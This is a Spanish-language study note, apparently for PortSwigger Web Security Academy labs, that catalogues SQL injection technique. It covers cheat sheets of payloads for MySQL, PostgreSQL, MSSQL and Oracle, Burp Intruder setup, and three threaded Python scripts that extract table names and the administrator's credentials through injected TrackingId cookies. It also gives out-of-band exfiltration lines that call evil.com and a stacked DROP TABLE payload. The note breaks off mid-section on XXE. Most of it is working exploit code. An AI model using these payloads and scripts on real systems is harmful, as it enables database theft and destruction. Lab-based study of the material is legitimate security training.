Tags: #Sql #Postgres #mysql #database #inyección #injection #explotación #Exploitation #blind #herramientas #tools

---

# 1. Definición

> La inyección SQL, también conocida como SQLi, es un tipo de ciberataque en el que un atacante inyecta código SQL malicioso en una aplicación web para manipular una base de datos y acceder a información confidencial. Este tipo de ataque se basa en la introducción de comandos SQL en un sitio web, lo que permite a los hackers obtener acceso no autorizado a datos sensibles.

---

# 2. Referencia Técnica (Cheatsheets)

## 🧪 Lenguaje SQL por Motor de Base de Datos (Versión Pro)

|**Función / Acción**|**MySQL**|**PostgreSQL**|**Microsoft SQL Server**|**Oracle DB**|
|---|---|---|---|---|
|**Concatenar texto**|`CONCAT('a','b')` o `'a' 'b'`|`'a' \| 'b'`|`'a' + 'b'`|`'a' \| 'b'`|
|**Subcadena**|`SUBSTRING('abc',1,2)`|`SUBSTRING('abc',1,2)`|`SUBSTRING('abc',1,2)`|`SUBSTR('abc',1,2)`|
|**Comentarios**|`--` (espacio), `#`|`--` , `/* */`|`--` , `/* */`|`--` , `/* */`|
|**Versión de BD**|`SELECT @@version`|`SELECT version()`|`SELECT @@version`|`SELECT banner FROM v$version`|
|**Bases de Datos**|`SELECT schema_name FROM information_schema.schemata`|`SELECT datname FROM pg_database`|`SELECT name FROM master..sysdatabases`|`SELECT username FROM all_users`|
|**Listar tablas**|`SELECT table_name FROM information_schema.tables`|`SELECT table_name FROM information_schema.tables`|`SELECT table_name FROM information_schema.tables`|`SELECT table_name FROM all_tables`|
|**Columnas**|`SELECT column_name FROM information_schema.columns WHERE table_name='X'`|`SELECT column_name FROM information_schema.columns WHERE table_name='X'`|`SELECT column_name FROM information_schema.columns WHERE table_name='X'`|`SELECT column_name FROM all_tab_columns WHERE table_name='X'`|
|**Limitar a 1 fila**|`LIMIT 1`|`LIMIT 1`|`TOP 1`|`WHERE ROWNUM = 1`|

¡NOTA! ORACLE siempre necesita una tabla especificada: Ej -> ... FROM **DUAL**

## 🧱 Comentarios por Motor

|**Motor**|**Comentario estilo SQL**|
|---|---|
|MySQL|`--` (con espacio), `#`, `/* */`|
|PostgreSQL|`--`, `/* */`|
|MSSQL|`--`, `/* */`|
|Oracle|`--`, `/* */`|

## 🧰 Parámetros útiles para pruebas manuales

|**Acción**|**Ejemplo**|
|---|---|
|Ver versión|`SELECT @@version` / `SELECT version()`|
|Saber el usuario actual|`SELECT user()`|
|Listar bases de datos|`SELECT schema_name FROM information_schema.schemata`|
|Listar tablas de una BD|`SELECT table_name FROM information_schema.tables WHERE table_schema='db'`|
|Ver columnas de una tabla|`SELECT column_name FROM information_schema.columns WHERE table_name='users'`|

---

# 3. Clasificación General

## 🔍 Tipos de ataques SQLi

|**Tipo de Ataque**|**Explicación simple 🧾**|**¿Qué se logra? 🎯**|
|---|---|---|
|**Inyección clásica**|Inserción directa de SQL en un parámetro visible.|Acceso a datos visibles.|
|**Blind SQLi (Boolean)**|No hay mensajes de error, pero cambia la respuesta según el resultado.|Confirmar condiciones (sí/no).|
|**Blind SQLi (Time)**|No hay mensajes visibles, pero la respuesta se retrasa si es verdadera.|Extraer datos poco a poco con tiempo.|
|**Error-Based**|El error de la BD revela información (columna, tabla, etc.).|Extraer info visible desde mensajes de error.|
|**Union-Based**|Se combinan dos consultas para mostrar información extra.|Ver resultados de otras tablas.|
|**Stacked Queries**|Se ejecutan varias consultas a la vez.|Usado en Blind para forzar acciones.|
|**Out-of-band (OOB)**|Extrae datos por DNS, HTTP u otro canal externo.|Extraer datos en entornos muy restringidos.|

---

# 4. Metodología: Técnicas Visibles (In-Band)

## 1️⃣ Inyección Clásica (Visible/Error-Based)

### 🧠 Metodología

> [!info] ¿En qué consiste?
> 
> Se inserta SQL directamente en campos visibles (GET/POST/cookies) para alterar la lógica de la consulta. Es el tipo más directo y evidente.

### 🧩 Sintaxis por SGBD

|**Motor**|**Ejemplo clásico**|
|---|---|
|**MySQL**|`1' OR 1=1--`|
|**PostgreSQL**|`1' OR '1'='1'--`|
|**MSSQL**|`1' OR 1=1--`|
|**Oracle**|`1' OR 'a'='a'--`|

### 🧰 Parámetros útiles

|**Consulta**|**Ejemplo**|
|---|---|
|Usuario actual|`SELECT user()`|
|Versión de BD|`SELECT @@version` (MySQL)<br><br>  <br><br>`SELECT version()` (PostgreSQL)|
|Tablas disponibles|`SELECT * FROM information_schema.tables`|

> [!example]+
> 
> 💥 Ejemplo real (GET)
> 
> `http://victima.com/item.php?id=1' OR 1=1--`

---

## 4️⃣ Visible Error-Based SQLi (Profundización)

### 🧠 Metodología

> [!info] ¿En qué consiste?
> 
> Se fuerza un error deliberadamente que revele datos dentro del mensaje de error.

### 🧩 Sintaxis por SGBD

|**Motor**|**Técnica**|
|---|---|
|**MySQL**|`SELECT EXTRACTVALUE(1, CONCAT(0x5c, (SELECT database())))`|
|**PostgreSQL**|`SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`|
|**MSSQL**|`SELECT 1/0`|
|**Oracle**|`SELECT TO_CHAR(1/0) FROM dual`|

### 1. El Concepto Fundamental

El objetivo es causar un **error de conversión de datos**. Obligamos a la base de datos a realizar una operación inválida (como convertir texto en un número entero). Cuando el motor falla, genera un mensaje de error que incluye el valor que intentó procesar.

**Lógica del ataque:**

1. **Inyectar una comparación numérica:** `... WHERE id = '' OR 1 = [NUESTRA_QUERY]`
    
2. **Forzar la conversión:** Pedimos que el resultado de un `SELECT` (que es texto) sea tratado como un número (`INT`).
    
3. **Lectura del error:** El servidor responde: _No se puede convertir el valor 'CONTRASEÑA_REAL' al tipo de dato INT_.
    

### 2. Pasos de la Auditoría

#### Paso A: Detección de errores

Añade una comilla simple (`'`) al parámetro. Si la página muestra un error detallado de SQL (como el que pusiste de "Unterminated string literal"), la web es vulnerable y "habladora".

#### Paso B: Comprobación de longitud (Límite de caracteres)

Si tu payload se corta (como te pasó en la posición 95), debes:

- Eliminar espacios innecesarios.
    
- Usar funciones más cortas.
    
- Usar alias de tablas cortos.
    

#### Paso C: Exfiltración de datos

Ejecutar la query de conversión para extraer nombres de tablas, columnas o credenciales.

### 3. Tabla Comparativa: Oracle vs. MySQL

|**Característica**|**MySQL / PostgreSQL**|**Oracle**|
|---|---|---|
|**Función de conversión**|`CAST(valor AS INT)`|`TO_NUMBER(valor)`|
|**Concatenación**|`CONCAT(col1, ':', col2)`|`col1 \| ':' \| col2`|
|**Limitar a 1 fila**|`LIMIT 1`|`WHERE ROWNUM = 1`|
|**Tabla obligatoria**|No requiere (o `FROM dual`)|**Obligatorio** `FROM dual` o tabla real|
|**Comentario final**|`-- -` o `#`|`--`|

### 4. Ejemplos Prácticos (Payloads Reales)

Usando tu ejemplo de `TrackingId` para extraer la contraseña del primer usuario:

#### En MySQL (Sintaxis corta):

SQL

```
' OR 1=CAST((SELECT password FROM users LIMIT 1) AS UNSIGNED)-- -
```

#### En Oracle (Sintaxis optimizada):

Oracle no tiene `LIMIT`, usa `ROWNUM`. Además, `TO_NUMBER` es la forma más corta de forzar el error:

SQL

```
' AND 1=TO_NUMBER((SELECT password FROM users WHERE ROWNUM=1))--
```

---

## 5️⃣ Union-Based SQLi

### 🧠 Metodología

> [!info] ¿En qué consiste?
> 
> Se usa UNION SELECT para combinar la consulta legítima con otra que extrae información de interés, mostrando los resultados en la misma página.

### 🧩 Sintaxis por SGBD

|**Motor**|**Ejemplo**|
|---|---|
|**MySQL**|`' UNION SELECT null, user(), null--`|
|**PostgreSQL**|`' UNION SELECT null, version(), null--`|
|**MSSQL**|`' UNION SELECT null, @@version, null--`|
|**Oracle**|`' UNION SELECT null, banner FROM v$version--`|

### 🧰 Pasos comunes

1. Detectar número de columnas con `ORDER BY`.
    
2. Usar `UNION SELECT` con mismo número de columnas.
    
3. Extraer información usando funciones de interés.
    

> [!example]+
> 
> 🎯 Union SELECT
> 
> `' UNION SELECT null, database(), null--`

---

# 5. Metodología: Técnicas Ciegas (Blind)

## 2️⃣ Blind SQLi (Boolean-Based)

### 🧠 Metodología

> [!info] ¿En qué consiste?
> 
> No se muestran errores. El atacante modifica la lógica con condiciones booleanas (TRUE/FALSE) y observa cambios en el comportamiento de la respuesta (contenido, redirección, código HTTP).

### 🧩 Sintaxis por SGBD

|**Motor**|**TRUE**|**FALSE**|
|---|---|---|
|**MySQL**|`' AND 1=1--`|`' AND 1=2--`|
|**PostgreSQL**|`' AND 1=1--`|`' AND 1=2--`|
|**MSSQL**|`' AND 1=1--`|`' AND 1=2--`|
|**Oracle**|`' AND 'a'='a'--`|`' AND 'a'='b'--`|

### Guía de Inyección Blind SQL con Payloads (Cluster Bomb)

|**SGBD**|**Listar Bases de Datos (Esquemas)**|**Listar Tablas (de la DB actual)**|**Listar Columnas (de una tabla)**|
|---|---|---|---|
|**PostgreSQL**|`' AND (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`|
|**MySQL**|`... (SELECT SUBSTRING(schema_name,§1§,1) FROM information_schema.schemata LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET §0§) = '§a§'--`|`... (SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='usuarios' LIMIT 1 OFFSET §0§) = '§a§'--`|
|**MS SQL Server**|`... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM master..sysdatabases) t WHERE row=§0§+1) = '§a§'--`|`... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM sysobjects WHERE xtype='U') t WHERE row=§0§+1) = '§a§'--`|`... (SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as row FROM syscolumns WHERE id=OBJECT_ID('usuarios')) t WHERE row=§0§+1) = '§a§'--`|
|**Oracle**|`... (SELECT SUBSTR(username,§1§,1) FROM (SELECT username, rownum as r FROM all_users) WHERE r=§0§+1) = '§a§'--`|`... (SELECT SUBSTR(table_name,§1§,1) FROM (SELECT table_name, rownum as r FROM all_tables) WHERE r=§0§+1) = '§a§'--`|`... (SELECT SUBSTR(column_name,§1§,1) FROM (SELECT column_name, rownum as r FROM all_tab_columns WHERE table_name='USUARIOS') WHERE r=§0§+1) = '§a§'--`|

> [!example]+
> 
> 🔍 Prueba de condición
> 
> `' AND SUBSTRING((SELECT user()),1,1) = 'r'--`

---

### Script en python para automatizar el proceso de descubrimiento de BBDD, Tablas, Columnas y Datos en un SQLi a ciegas basada en condicionales booleanos:

Python

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor

# ==========================================================
# CONFIGURACIÓN
# ==========================================================

TARGET_URL = "https://0aa200f1030622d486e3ed4600a900c0.web-security-academy.net/filter?category=Tech+gifts"
TRACKING_ID = "yvEKcnMPOixN5muq"
SESSION_ID = "ih3JmMMmarvDxyo7tAz2cILT64wMi13D"

SUCCESS_MARKER = "Welcome back!"
CHARSET = string.ascii_lowercase + string.digits + "_,"
THREADS = 10  # Número de peticiones simultáneas (ajusta según estabilidad)

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
}

# ==========================================================
# LÓGICA MEJORADA
# ==========================================================

def check_char(pos, char, row):
    """Función que realiza una sola petición para un carácter específico."""
    sql_query = f"(SELECT SUBSTRING(table_name,{pos},1) FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {row}) = '{char}'"
    full_cookie = f"{TRACKING_ID}' AND {sql_query}--"
    cookies = {"TrackingId": full_cookie, "session": SESSION_ID}
    try:
        r = requests.get(TARGET_URL, cookies=cookies, headers=HEADERS, timeout=10)
        if SUCCESS_MARKER in r.text:
            return char
    except:
        pass
    return None

def start_extraction():
    print(f"[*] Iniciando extracción con {THREADS} hilos...")
    for row in range(0, 10): # Iterar sobre tablas
        table_name = ""
        print(f"\n[+] Extrayendo Tabla #{row + 1}:")
        for pos in range(1, 100): # Iterar sobre posición de caracteres
            found_char = None
            # Usamos un pool de hilos para probar el charset en paralelo
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                # Mapeamos la función check_char a todo el abecedario
                results = list(executor.map(lambda c: check_char(pos, c, row), CHARSET))
                # Buscamos si alguno de los hilos devolvió el carácter correcto
                for res in results:
                    if res:
                        found_char = res
                        break
            if found_char:
                table_name += found_char
                print(f"    -> {table_name}", end="\r")
            else:
                # Si no hay carácter en esta posición, la tabla terminó
                break
        if not table_name:
            print("[*] No se encontraron más tablas.")
            break
        print(f"\n[!] Tabla encontrada: {table_name}")

if __name__ == "__main__":
    start_extraction()
```

---

## Blind SQLi Basado en Errores Condicionales (Sentencias Listas)

| **Objetivo**         | **Oracle (Basado en CASE y 1/0)**                                                                                                                                                                                                                                                                                                                                                                | **MySQL (Basado en IF y EXP(710))**                                                                                                     |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| **Gatillo de Error** | `TO_CHAR(1/0)`                                                                                                                                                                                                                                                                                                                                                                                   | `EXP(710)`                                                                                                                              |
| **Listar BDD**       | `' AND (SELECT CASE WHEN (SUBSTR(owner,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM all_tables WHERE rownum=1)='a-- -`<br><br><br>- Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(o,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT owner AS o, rownum AS rn FROM all_tables) WHERE rn=2)='a-- -`                                                                  | `' AND (SELECT IF(SUBSTR(schema_name,1,1)='a', EXP(710), 1) FROM information_schema.schemata LIMIT 0,1)='1-- -`                         |
| **Listar Tablas**    | `' AND (SELECT CASE WHEN (SUBSTR(table_name,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM all_tables WHERE rownum=1)='a-- -`<br><br>  <br>-Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(t,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT table_name AS t, rownum AS rn FROM all_tab_columns WHERE table_name='USERS') WHERE rn=2)='a-- -`                         | `' AND (SELECT IF(SUBSTR(table_name,1,1)='a', EXP(710), 1) FROM information_schema.tables LIMIT 0,1)='1-- -`                            |
| **Listar Columnas**  | `' AND (SELECT CASE WHEN (SUBSTR(column_name,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM all_tab_columns WHERE table_name='USERS' AND rownum=1)='a-- -`<br><br><br>-Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(c,1,1)='A') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT column_name AS c, rownum AS rn FROM all_tab_columns WHERE table_name='USERS') WHERE rn=2)='a` | `' AND (SELECT IF(SUBSTR(column_name,1,1)='a', EXP(710), 1) FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='1-- -` |
| **Extraer Datos**    | `' AND (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' AND rownum=1)='a-- -`<br><br><br>-Elegir posición a descubrir:<br><br>`' AND (SELECT CASE WHEN (SUBSTR(p,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM (SELECT password AS p, rownum AS rn FROM users) WHERE rn=2)='a-- -`                                          | `' AND (SELECT IF(SUBSTR(password,1,1)='a', EXP(710), 1) FROM users LIMIT 0,1)='1-- -`                                                  |

> [!example]+
> 
> 💥 Forzar error con contenido
> 
> `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`

### Ejemplo de script en python para enumerar con Blind SQLi basado en errores

Python

```python
import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURACIÓN ---
URL = "https://0a220027046ee561804ce48d00d20077.web-security-academy.net/filter?category=Pets"
TRACKING_ID = "gUq0xv9rXGDNcOHk"
SESSION = "On0TYNflf10guAWWRXJRVi62F2fS9jaJ"

# --- VARIABLE GLOBAL DE QUERY ---
# Opción 1: Tablas
QUERY_BASE = "SELECT table_name FROM user_tables"

# Opción 2: Columnas (Recuerda poner el nombre de la tabla en MAYÚSCULAS)
# QUERY_BASE = "SELECT column_name FROM user_tab_columns WHERE table_name='USERS'"

# --- CONFIGURACIÓN TÉCNICA ---
CHARSET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_$:-"
MAX_HILOS = 20

def check_char(fila, pos, char):
    # Extraemos el nombre de la columna dinámicamente de la QUERY_BASE
    # (Toma la palabra justo después del primer SELECT)
    col_name = QUERY_BASE.split()[1]

    # Estructura de alias estable que ya probamos que funciona
    sql = (
        f"' AND (SELECT CASE WHEN (SUBSTR(t.target,{pos},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END "
        f"FROM (SELECT {col_name} AS target, rownum AS rn FROM ({QUERY_BASE})) t "
        f"WHERE t.rn={fila})='a"
    )

    cookies = {"TrackingId": f"{TRACKING_ID}{sql}", "session": SESSION}

    try:
        r = requests.get(URL, cookies=cookies, timeout=10)
        if r.status_code == 500:
            # Doble verificación para evitar falsos positivos AAAAA
            sql_fake = sql.replace(f"='{char}'", "='§'")
            r_fake = requests.get(URL, cookies={"TrackingId": f"{TRACKING_ID}{sql_fake}", "session": SESSION}, timeout=5)
            if r_fake.status_code != 500:
                return char
    except:
        pass
    return None

def main():
    print(f"[+] Auditando: {QUERY_BASE}")

    for fila in range(1, 21):
        res_fila = ""
        print(f"[*] Fila {fila}: ", end="", flush=True)
        found_any = False

        for pos in range(1, 51):
            letra_encontrada = None
            with ThreadPoolExecutor(max_workers=MAX_HILOS) as executor:
                futures = [executor.submit(check_char, fila, pos, c) for c in CHARSET]
                for future in futures:
                    letra = future.result()
                    if letra:
                        letra_encontrada = letra
                        break

            if letra_encontrada:
                res_fila += letra_encontrada
                print(letra_encontrada, end="", flush=True)
                found_any = True
            else:
                if pos == 1:
                    print("(Vacia)")
                else:
                    print("") # Salto de línea al terminar la palabra
                break

        if not found_any and fila > 1:
            break

        time.sleep(0.3)

if __name__ == "__main__":
    main()
```

### Ejemplo de script en python para extraer datos con Blind SQLi basado en errores

Python

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor

# CONFIGURACIÓN DEL LABORATORIO
url = "https://0adb009e0356318580bf08f700af004c.web-security-academy.net/filter?category=Pets"
tracking_id_prefix = "X36Cbo9MaaXKlmwq"
session_cookie = "NkymGUG7kcPOZo9R1pa0cEk3CeZPxVX7"

# Caracteres a probar (Oracle es case-sensitive para datos, no para nombres de tabla)
charset = string.ascii_letters + string.digits + ':_-'
extracted_data = [""] * 50 # Espacio para 30 caracteres

def check_char(pos, char):
    # --- CAMBIA LA QUERY AQUÍ SEGÚN TU OBJETIVO ---
    # Ejemplo para PASSWORD del administrador:
    payload = f"' AND (SELECT CASE WHEN (SUBSTR(username || ':' || password,{pos},1)='{char}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
    cookies = {
        "TrackingId": f"{tracking_id_prefix}{payload}",
        "session": session_cookie
    }
    try:
        response = requests.get(url, cookies=cookies, timeout=10)
        if response.status_code == 500:
            return char
    except Exception:
        pass
    return None

def run_extraction():
    print("[+] Extrayendo datos con hilos...")
    # Probamos posiciones de la 1 a la 20
    for i in range(1, 50):
        with ThreadPoolExecutor(max_workers=20) as executor:
            # Enviamos todas las letras del charset a hilos diferentes para la posición i
            futures = [executor.submit(check_char, i, char) for char in charset]
            found = False
            for future in futures:
                result = future.result()
                if result:
                    extracted_data[i] = result
                    print(f"[!] Posición {i}: {result} -> {''.join(extracted_data)}")
                    found = True
                    break
        if not found:
            break

    print(f"\n[FIN] Resultado: {''.join(extracted_data)}")

if __name__ == "__main__":
    run_extraction()
```

---

## 3️⃣ Blind SQLi (Time-Based)

### 🧠 Metodología

> [!info] ¿En qué consiste?
> 
> Si no hay errores ni cambios visibles, se prueba con funciones que retrasan la respuesta al evaluar una condición. Se usa para extraer datos bit a bit.

##Blind SQL Injection (Time-Based) v2

La inyección basada en tiempo es la técnica "de último recurso". Se utiliza cuando la aplicación no devuelve datos ni errores, pero podemos medir cuánto tarda el servidor en responder.

---

## 1. Fase de Detección: ¿Es vulnerable?

El primer paso es confirmar la vulnerabilidad inyectando una pausa. Si la respuesta del servidor se retrasa el tiempo indicado, la vulnerabilidad existe.

### Tabla de Payloads de Confirmación

| **SGBD**       | **Payload de Prueba**                          | **Explicación**                            |
| -------------- | ---------------------------------------------- | ------------------------------------------ |
| **PostgreSQL** | `KwTG899Hl3TwsMFW' \|\| pg_sleep(10)-- -`      | Concatenación + función de sueño.          |
| **MySQL**      | `' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--` | Usa `SLEEP()` dentro de una subconsulta.   |
| **MS SQL**     | `'; WAITFOR DELAY '0:0:10'--`                  | Usa el comando específico `WAITFOR DELAY`. |
| **Oracle**     | `' AND 1=dbms_pipe.receive_message('a',10)--`  | Usa el paquete `dbms_pipe` para esperar.   |

---

## 2. Fase Avanzada: Estructuras Condicionales

Usamos estas plantillas para envolver nuestras consultas de extracción.

| **SGBD**       | **Sintaxis Condicional (Template)**                                                                    |
| -------------- | ------------------------------------------------------------------------------------------------------ |
| **PostgreSQL** | `' \|\| (SELECT CASE WHEN (CONDICION) THEN pg_sleep(10) ELSE pg_sleep(0) END) \|\| '`                  |
| **MySQL**      | `' AND IF(CONDICION, SLEEP(10), 1)--`                                                                  |
| **MS SQL**     | `'; IF (CONDICION) WAITFOR DELAY '0:0:10'--`                                                           |
| **Oracle**     | `' AND (SELECT CASE WHEN (CONDICION) THEN dbms_pipe.receive_message('a',10) ELSE 'a' END FROM dual)--` |

---

## 3. Diccionario de Consultas con Iteración (LIMIT/OFFSET)

Sustituye `CONDICION` por estas sentencias. Usa **§0§** para la fila, **§1§** para la posición del carácter y **§a§** para el carácter.

### A. Listar Tablas (Iterando con §0§)

|**SGBD**|**Consulta para la Condición (Iterativa)**|
|---|---|
|**PostgreSQL**|`(SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables LIMIT 1 OFFSET §0§)='§a§'`|
|**MySQL**|`(SELECT SUBSTRING(table_name,§1§,1) FROM information_schema.tables WHERE table_schema=database() LIMIT §0§,1)='§a§'`|
|**MS SQL**|`(SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as r FROM sysobjects WHERE xtype='U') t WHERE r=§0§+1)='§a§'`|
|**Oracle**|`(SELECT SUBSTR(t,§1§,1) FROM (SELECT table_name as t, ROWNUM as r FROM all_tables) WHERE r=§0§+1)='§a§'`|

### B. Listar Columnas (de una tabla específica)

| **SGBD**       | **Consulta para la Condición (Iterativa)**                                                                                                                    |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PostgreSQL** | `(SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §0§)='§a§'`                                     |
| **MySQL**      | `(SELECT SUBSTRING(column_name,§1§,1) FROM information_schema.columns WHERE table_name='users' LIMIT §0§,1)='§a§'`                                            |
| **MS SQL**     | `(SELECT SUBSTRING(name,§1§,1) FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) as r FROM syscolumns WHERE id=OBJECT_ID('users')) t WHERE r=§0§+1)='§a§'` |

### C. Extraer Datos (Ejemplo: Passwords)

| **SGBD**       | **Consulta para la Condición (Iterativa)**                                                           |
| -------------- | ---------------------------------------------------------------------------------------------------- |
| **PostgreSQL** | `(SELECT SUBSTRING(password,§1§,1) FROM users LIMIT 1 OFFSET §0§)='§a§'`                             |
| **MySQL**      | `(SELECT SUBSTRING(password,§1§,1) FROM users LIMIT §0§,1)='§a§'`                                    |
| **Oracle**     | `(SELECT SUBSTR(password,§1§,1) FROM (SELECT password, ROWNUM as r FROM users) WHERE r=§0§+1)='§a§'` |

---

## 4. Configuración en Burp Suite (Cluster Bomb)

Para extraer automáticamente usando estos apuntes, configura tus **Payload Sets**:

1. **Payload 1 (§0§ - Fila):** Tipo "Numbers". De 0 a 20 (para ver las primeras 20 tablas/filas).
    
2. **Payload 2 (§1§ - Posición):** Tipo "Numbers". De 1 a 30 (longitud del nombre).
    
3. **Payload 3 (§a§ - Carácter):** Tipo "Simple List". Diccionario `a-z, 0-9, _`.
    

---

## 💡 Tips Finales

- **Ajuste de Fila:** En MySQL y Postgres el offset empieza en **0**. En MSSQL y Oracle (con ROWNUM) se suele ajustar sumando 1 porque las filas se cuentan desde 1.
    
- **Filtrado en Burp:** Activa la columna **"Response received"** en la pestaña de resultados y ordena de mayor a menor para ver los aciertos (peticiones de >10s).


---

## Script en Python para enumerar la base de datos(Tablas, columnas, BBDD, datos) solo cambiando la condición de Blind SQLi basado en tiempo:

```python
import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor

# ==========================================================
# CONFIGURACIÓN DEL OBJETIVO
# ==========================================================
URL = "https://0a930016030f0d0580ecd524004f0069.web-security-academy.net/filter?category=Gifts"
TRACKING_ID_BASE = "hePKxag10TflyebE"
SESSION_ID = "5kf5ip1XZGTUJ6Qxq8C2D6xaw3RYWteB"

# Configuración de tiempos
SLEEP_TIME = 3   # Segundos en pg_sleep
THRESHOLD = 2    # Ajustado al mismo tiempo del sleep para evitar falsos positivos
TIMEOUT = 10     # Tiempo máximo de espera de la petición

# Diccionario de búsqueda
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_,:$"
THREADS = 15      # Recomendado 1 para Time-Based para evitar saturar el servidor

# ==========================================================
# LÓGICA DE EXTRACCIÓN
# ==========================================================

def check_char(fila, pos, char):
    # Usamos la lógica de concatenación || para PostgreSQL
    condicion = f"(SELECT SUBSTRING(username || ':' || password,{pos},1) FROM users LIMIT 1 OFFSET {fila})='{char}'"
    payload = f"{TRACKING_ID_BASE}' || (SELECT CASE WHEN ({condicion}) THEN pg_sleep({SLEEP_TIME}) ELSE pg_sleep(0) END) || '"
    
    cookies = {
        "TrackingId": payload,
        "session": SESSION_ID
    }

    start_time = time.time()
    try:
        # Realizamos la petición
        requests.get(URL, cookies=cookies, timeout=TIMEOUT)
        elapsed = time.time() - start_time
        
        # Si el tiempo de respuesta es >= al sleep, hemos acertado
        if elapsed >= THRESHOLD:
            return char
    except Exception:
        # En ataques de tiempo, un timeout del script suele ser un acierto
        return char
    return None

def start_extraction():
    print("[*] Iniciando extracción Time-Based en PostgreSQL...")
    
    for fila in range(0, 5):
        extracted_data = ""
        print(f"\n[+] Registro #{fila + 1}: ", end="", flush=True)
        
        for pos in range(1, 50):
            found_char = None
            
            # Nota: En Time-Based, usar muchos hilos suele dar falsos positivos.
            # Si falla, cambia THREADS a 1.
            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                futures = [executor.submit(check_char, fila, pos, c) for c in CHARSET]
                for future in futures:
                    res = future.result()
                    if res:
                        found_char = res
                        break
            
            if found_char:
                extracted_data += found_char
                print(found_char, end="", flush=True)
            else:
                break
        
        if not extracted_data:
            print("\n[*] No se encontraron más registros.")
            break

if __name__ == "__main__":
    start_extraction()
```


---

# 6. Técnicas Avanzadas

## 6️⃣ Stacked Queries (Multi-consulta)

### 🧠 Metodología

> [!info] ¿En qué consiste?
> 
> Permite ejecutar múltiples sentencias SQL separadas por ;. Útil para ataques ciegos, inserciones forzadas o exfiltración.

### 🧩 Sintaxis por SGBD

|**Motor**|**Sintaxis**|
|---|---|
|**MySQL**|`1'; DROP TABLE users--` (solo en algunas APIs)|
|**PostgreSQL**|`1'; SELECT pg_sleep(5);--`|
|**MSSQL**|`1'; WAITFOR DELAY '0:0:5';--`|
|**Oracle**|❌ No soporta múltiples consultas|

> [!warning]
> 
> ⚠ MySQL por defecto no permite stacked queries salvo que la aplicación use APIs vulnerables como mysqli_multi_query.

---

## 7️⃣ Out-Of-Band (OOB) Exfiltration

### 🧠 Metodología

> [!info] ¿En qué consiste?
> 
> Se usan canales como DNS o HTTP para exfiltrar datos fuera del entorno. Muy útil en entornos sin errores visibles ni tiempo.

### 🧩 Sintaxis por SGBD

|**Motor**|**Sintaxis de exfiltración DNS**|
|---|---|
|**MySQL**|`SELECT YOUR-DATA INTO OUTFILE '\\\\evil.com\\leak.txt'`|
|**PostgreSQL**|`COPY (SELECT '') TO PROGRAM 'nslookup your-data.evil.com'`|
|**MSSQL**|`EXEC master..xp_dirtree '\\evil.com\leak'`|
|**Oracle**|`SELECT UTL_INADDR.get_host_address('your-data.evil.com') FROM dual`|

> [!tip]
> 
> Usa Burp Collaborator para recibir las peticiones DNS/HTTP salientes.

---
## SQL Injection vía XXE (XML Injection)

Esta vulnerabilidad ocurre cuando una aplicación procesa datos XML (como un `stockCheck`) y los utiliza directamente en una consulta a la base de datos. Al estar dentro de etiquetas XML, el servidor suele aplicar filtros de seguridad, por lo que usamos **Hackvertor** para codificar el payload.

## 1. La técnica: Hackvertor Hex Entities

Hackvertor permite enviar caracteres que normalmente dispararían un WAF (Web Application Firewall).

- **Etiqueta:** `<@hex_entities> ... </@hex_entities>`
    
